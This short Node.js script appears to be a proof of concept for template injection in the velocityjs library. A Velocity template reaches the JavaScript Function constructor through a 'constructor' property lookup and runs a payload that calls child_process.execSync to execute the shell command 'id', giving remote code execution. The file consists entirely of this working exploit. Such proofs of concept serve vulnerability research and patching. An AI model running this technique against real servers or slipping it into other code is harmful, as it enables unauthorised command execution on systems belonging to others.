const velocityjs = require('velocityjs');

const context = {
    foo: {},
    bar: "constructor",
    payload: 'console.log("RCE!"); return process.mainModule.require("child_process").execSync("id").toString()'
};

// Trying to get function constructor and call it
const template = velocityjs.parse('#set($fn = $foo[$bar].constructor)\n$fn($payload)()');
const comp = new velocityjs.Compile(template);
console.log(comp.render(context));
